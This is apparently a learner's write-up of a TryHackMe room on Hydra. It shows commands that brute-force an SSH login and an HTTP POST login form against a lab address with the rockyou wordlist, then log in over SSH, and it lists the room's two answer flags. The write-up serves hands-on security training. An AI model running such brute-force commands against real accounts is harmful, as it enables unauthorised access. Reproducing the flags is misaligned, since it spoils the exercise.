**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Offensive Tools
**Date:** 17 May 2026

---

## Objective
Learn how to use brute forcing tool, Hydra to brute-force http post login form.

---

## Key Concepts Learned
- SSH brute force
- POST-HTTP Login brute force
- using offline wordlist to brute force.

---

## Hydra Syntax Practiced
```shell
hydra -l molly -P rockyou.txt 10.10.10.10 -t 4 ssh
```
*What it does: brute-forcing ssh login using login id molly and password list.*

```shell
hydra -l molly -P rockyou.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -s 80 -V`
```
*What it does: brute force web login page, using id molly and wordlist as password. **F=incorrect** to be change to match the login error on webpage, and **/login** is endpoint/path to login page.*

```shell
ssh molly@10.10.10.10
```
*What it does: login to ssh after getting password from hydra.*

---

## Answers & Analysis
每道题你怎么找到答案的，思路是什么。

**Q: Use Hydra to brute-force molly's web password. What is the value of flag 1?**  
**A:** THM{2673a7dd116de68e85c48ec0b1f2612e} - using HTTP-POST method to bruteforce. syntax must be match the information as the login form.

**Q: Use Hydra to brute-force molly's SSH password. What is the value of flag 2?**  
**A:** THM{c8eeb0468febbadea859baeb33b2541b} - using ssh brute force method. 

---

## Takeaways
i feel that common password are very easy to brute-force.
and hydra syntax must be accurate otherwise will be wasting of time to keep trying. especially HTTP-POST bruteforce syntax.


